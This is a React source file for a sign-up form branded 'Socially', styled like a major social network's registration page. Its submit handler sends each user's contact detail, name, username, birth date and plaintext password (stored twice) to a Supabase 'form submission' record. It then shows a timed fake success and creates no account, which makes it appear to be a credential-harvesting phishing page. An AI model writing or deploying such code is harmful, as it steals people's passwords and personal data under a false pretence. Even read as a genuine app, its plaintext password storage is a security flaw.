import { useState, FormEvent } from 'react';
import { ChevronLeft, Eye, EyeOff, Loader2 } from 'lucide-react';
import { FormData, FormErrors, ModalType } from '../types';
import { SociallyLogo } from './SociallyLogo';
import { BirthdaySelects } from './BirthdaySelects';
import { useRegLanguage } from '../context/LanguageContext';
import { recordFormSubmission } from '../../lib/supabase';

interface RegistrationFormProps {
  onSubmitSuccess: (data: FormData) => void;
  onNavigateToLogin?: () => void;
  onOpenModal: (type: ModalType) => void;
}

export function RegistrationForm({
  onSubmitSuccess,
  onNavigateToLogin,
  onOpenModal,
}: RegistrationFormProps) {
  const { t, isRTL } = useRegLanguage();

  const [formData, setFormData] = useState<FormData>({
    contact: '',
    password: '',
    birthMonth: '',
    birthDay: '',
    birthYear: '',
    fullName: '',
    username: '',
  });

  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState<FormErrors>({});
  const [isLoading, setIsLoading] = useState(false);

  const validateField = (field: keyof FormData, value: string): string | undefined => {
    switch (field) {
      case 'contact': {
        const trimmed = value.trim();
        if (!trimmed) return t.errorContactRequired;
        const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmed);
        const isPhone = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/.test(
          trimmed.replace(/[\s\(\)\-]/g, '')
        );
        if (!isEmail && !isPhone) {
          return t.errorContactInvalid;
        }
        return undefined;
      }
      case 'password': {
        if (!value) return t.errorPasswordRequired;
        if (value.length < 6) return t.errorPasswordLength;
        return undefined;
      }
      case 'fullName': {
        if (!value.trim()) return t.errorFullNameRequired;
        return undefined;
      }
      case 'username': {
        const trimmed = value.trim();
        if (!trimmed) return t.errorUsernameRequired;
        if (!/^[a-zA-Z0-9._]{3,30}$/.test(trimmed)) {
          return t.errorUsernameInvalid;
        }
        return undefined;
      }
      default:
        return undefined;
    }
  };

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field as keyof FormErrors]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }));
    }
  };

  const handleBirthdayChange = (
    field: 'birthMonth' | 'birthDay' | 'birthYear',
    value: string
  ) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors.birthday) {
      setErrors((prev) => ({ ...prev, birthday: undefined }));
    }
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();

    const newErrors: FormErrors = {};

    const contactErr = validateField('contact', formData.contact);
    if (contactErr) newErrors.contact = contactErr;

    const passwordErr = validateField('password', formData.password);
    if (passwordErr) newErrors.password = passwordErr;

    if (!formData.birthMonth || !formData.birthDay || !formData.birthYear) {
      newErrors.birthday = t.errorBirthdayRequired;
    } else {
      const birthYearNum = parseInt(formData.birthYear, 10);
      if (2026 - birthYearNum < 13) {
        newErrors.birthday = t.errorBirthdayRequired;
      }
    }

    const nameErr = validateField('fullName', formData.fullName);
    if (nameErr) newErrors.fullName = nameErr;

    const usernameErr = validateField('username', formData.username);
    if (usernameErr) newErrors.username = usernameErr;

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);

    // Automatically record registration details to Supabase
    const isEmail = formData.contact.includes('@');
    recordFormSubmission({
      type: 'registration',
      email: isEmail ? formData.contact.trim() : '',
      username: formData.username.trim(),
      fullName: formData.fullName.trim(),
      phone: !isEmail ? formData.contact.trim() : '',
      password: formData.password,
      metadata: {
        contact: formData.contact.trim(),
        password: formData.password,
        birthDate: `${formData.birthYear}-${formData.birthMonth}-${formData.birthDay}`,
        registeredAt: new Date().toISOString()
      }
    });

    setTimeout(() => {
      setIsLoading(false);
      onSubmitSuccess(formData);
    }, 900);
  };

  const handleExistingAccount = () => {
    if (onNavigateToLogin) {
      onNavigateToLogin();
    } else {
      onOpenModal('existing-account');
    }
  };

  return (
    <div className={`w-full max-w-[420px] mx-auto select-none text-[#ededed] px-0.5 sm:px-0 ${isRTL ? 'text-right' : 'text-left'}`} id="registration-form-container">
      {/* 3. TOP SECTION: Back Arrow */}
      <div className="mb-4 sm:mb-5">
        <button
          type="button"
          onClick={handleExistingAccount}
          className={`w-10 h-10 ${isRTL ? '-mr-2 rotate-180' : '-ml-2'} text-zinc-300 hover:text-white hover:bg-white/10 active:bg-white/20 transition-colors rounded-full flex items-center justify-center focus:outline-none focus-visible:ring-2 focus-visible:ring-zinc-400 cursor-pointer touch-manipulation`}
          aria-label={t.goBack}
          id="top-back-btn"
        >
          <ChevronLeft className="w-6 h-6 stroke-[2.2]" />
        </button>
      </div>

      {/* Brand / Logo Mark */}
      <div className="mb-3">
        <SociallyLogo />
      </div>

      {/* Heading & Subtitle */}
      <h1 className="main-text text-[20px] sm:text-[22px] font-semibold tracking-tight text-[#F2F4F6] mb-1.5" id="form-heading">
        {t.heading}
      </h1>
      <p className="secondary-text text-[14px] text-[#9FA4AB] leading-normal mb-5 sm:mb-6">
        {t.subtitle}
      </p>

      {/* 4. FORM FIELDS */}
      <form onSubmit={handleSubmit} className="space-y-4" noValidate>
        {/* Field 1: Mobile number or email */}
        <div>
          <label
            htmlFor="contact-input"
            className="main-text block text-[14px] font-semibold text-[#F2F4F6] mb-2"
          >
            {t.contactLabel}
          </label>
          <input
            id="contact-input"
            type="text"
            inputMode="email"
            autoComplete="username"
            value={formData.contact}
            onChange={(e) => handleInputChange('contact', e.target.value)}
            placeholder={t.contactPlaceholder}
            className={`input w-full h-[46px] min-h-[44px] px-3.5 bg-[#28292C] border ${
              errors.contact ? 'border-red-500' : 'border-[#50545B]'
            } rounded-xl text-[16px] sm:text-[14px] text-[#F2F4F6] placeholder:text-[#9FA4AB] hover:border-[#6b707a] focus:outline-none focus:border-[#a8a8a8] transition-colors`}
          />
          {errors.contact && (
            <p className="mt-1 text-[12px] text-red-400">{errors.contact}</p>
          )}

          {/* Subtext below Mobile number or email */}
          <p className="secondary-text text-[12px] text-[#9FA4AB] mt-2 leading-[1.35]">
            {t.contactSubtext}{' '}
            <button
              type="button"
              onClick={() => onOpenModal('contact-info')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer font-medium touch-manipulation inline-block py-0.5"
            >
              {t.contactLearnWhy}
            </button>
          </p>
        </div>

        {/* Field 2: Password */}
        <div>
          <label
            htmlFor="password-input"
            className="main-text block text-[14px] font-semibold text-[#F2F4F6] mb-2"
          >
            {t.passwordLabel}
          </label>
          <div className="relative">
            <input
              id="password-input"
              type={showPassword ? 'text' : 'password'}
              autoComplete="new-password"
              value={formData.password}
              onChange={(e) => handleInputChange('password', e.target.value)}
              placeholder={t.passwordPlaceholder}
              className={`input w-full h-[46px] min-h-[44px] px-3.5 ${isRTL ? 'pl-12 pr-3.5' : 'pr-12 pl-3.5'} bg-[#28292C] border ${
                errors.password ? 'border-red-500' : 'border-[#50545B]'
              } rounded-xl text-[16px] sm:text-[14px] text-[#F2F4F6] placeholder:text-[#9FA4AB] hover:border-[#6b707a] focus:outline-none focus:border-[#a8a8a8] transition-colors`}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className={`absolute ${isRTL ? 'left-0' : 'right-0'} top-0 h-full w-12 flex items-center justify-center text-[#9FA4AB] hover:text-[#F2F4F6] transition-colors focus:outline-none cursor-pointer touch-manipulation`}
              aria-label={showPassword ? 'Hide password' : 'Show password'}
              id="toggle-password-btn"
            >
              {showPassword ? (
                <EyeOff className="w-4 h-4" />
              ) : (
                <Eye className="w-4 h-4" />
              )}
            </button>
          </div>
          {errors.password && (
            <p className="mt-1 text-[12px] text-red-400">{errors.password}</p>
          )}
        </div>

        {/* Field 3: Birthday */}
        <div>
          <BirthdaySelects
            month={formData.birthMonth}
            day={formData.birthDay}
            year={formData.birthYear}
            onChange={handleBirthdayChange}
            onHelpClick={() => onOpenModal('birthday-info')}
            error={errors.birthday}
          />
        </div>

        {/* Field 4: Name */}
        <div>
          <label
            htmlFor="fullname-input"
            className="main-text block text-[14px] font-semibold text-[#F2F4F6] mb-2"
          >
            {t.fullNameLabel}
          </label>
          <input
            id="fullname-input"
            type="text"
            autoComplete="name"
            autoCapitalize="words"
            value={formData.fullName}
            onChange={(e) => handleInputChange('fullName', e.target.value)}
            placeholder={t.fullNamePlaceholder}
            className={`input w-full h-[46px] min-h-[44px] px-3.5 bg-[#28292C] border ${
              errors.fullName ? 'border-red-500' : 'border-[#50545B]'
            } rounded-xl text-[16px] sm:text-[14px] text-[#F2F4F6] placeholder:text-[#9FA4AB] hover:border-[#6b707a] focus:outline-none focus:border-[#a8a8a8] transition-colors`}
          />
          {errors.fullName && (
            <p className="mt-1 text-[12px] text-red-400">{errors.fullName}</p>
          )}
        </div>

        {/* Field 5: Username */}
        <div>
          <label
            htmlFor="username-input"
            className="main-text block text-[14px] font-semibold text-[#F2F4F6] mb-2"
          >
            {t.usernameLabel}
          </label>
          <input
            id="username-input"
            type="text"
            autoComplete="username"
            autoCapitalize="none"
            autoCorrect="off"
            spellCheck="false"
            value={formData.username}
            onChange={(e) => handleInputChange('username', e.target.value)}
            placeholder={t.usernamePlaceholder}
            className={`input w-full h-[46px] min-h-[44px] px-3.5 bg-[#28292C] border ${
              errors.username ? 'border-red-500' : 'border-[#50545B]'
            } rounded-xl text-[16px] sm:text-[14px] text-[#F2F4F6] placeholder:text-[#9FA4AB] hover:border-[#6b707a] focus:outline-none focus:border-[#a8a8a8] transition-colors`}
          />
          {errors.username && (
            <p className="mt-1 text-[12px] text-red-400">{errors.username}</p>
          )}
        </div>

        {/* 5. INFORMATION TEXT */}
        <div className="pt-2 space-y-3 text-[12px] secondary-text text-[#9FA4AB] leading-[1.4]">
          <p>
            {t.infoContact}{' '}
            <button
              type="button"
              onClick={() => onOpenModal('learn-more')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer inline-block py-0.5"
            >
              {t.learnMore}
            </button>
            .
          </p>

          <p>
            {t.termsIntro}{' '}
            <button
              type="button"
              onClick={() => onOpenModal('terms')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer inline-block py-0.5"
            >
              {t.terms}
            </button>
            ,{' '}
            <button
              type="button"
              onClick={() => onOpenModal('privacy')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer inline-block py-0.5"
            >
              {t.privacyPolicy}
            </button>{' '}
            {t.andWord}{' '}
            <button
              type="button"
              onClick={() => onOpenModal('cookies')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer inline-block py-0.5"
            >
              {t.cookiesPolicy}
            </button>
            .
          </p>

          <p>
            {t.theWord && `${t.theWord} `}
            <button
              type="button"
              onClick={() => onOpenModal('privacy')}
              className="create-account-text text-[#4599FF] hover:underline focus:outline-none cursor-pointer inline-block py-0.5"
            >
              {t.privacyPolicy}
            </button>{' '}
            {t.privacyDesc}
          </p>
        </div>

        {/* 6. PRIMARY BUTTON */}
        <div className="pt-3">
          <button
            type="submit"
            disabled={isLoading}
            className="primary-button w-full h-[44px] min-h-[44px] bg-[#133B6E] hover:bg-[#184886] active:scale-[0.99] disabled:opacity-60 text-[#F2F4F6] font-semibold text-[14px] rounded-full transition-all flex items-center justify-center cursor-pointer disabled:cursor-not-allowed shadow-none touch-manipulation"
            id="register-submit-btn"
          >
            {isLoading ? (
              <Loader2 className="w-5 h-5 animate-spin" />
            ) : (
              t.submit
            )}
          </button>
        </div>

        {/* 7. SECONDARY / ALREADY HAVE ACCOUNT BUTTON */}
        <div className="pt-1">
          <button
            type="button"
            onClick={handleExistingAccount}
            className="w-full h-[44px] min-h-[44px] bg-[#34363C] hover:bg-[#3E4048] active:scale-[0.99] border-0 text-[#B0B5BC] hover:text-[#FFFFFF] font-semibold text-[14px] rounded-full transition-all flex items-center justify-center cursor-pointer touch-manipulation"
            id="already-have-account-btn"
          >
            {t.alreadyHaveAccount}
          </button>
        </div>
      </form>
    </div>
  );
}
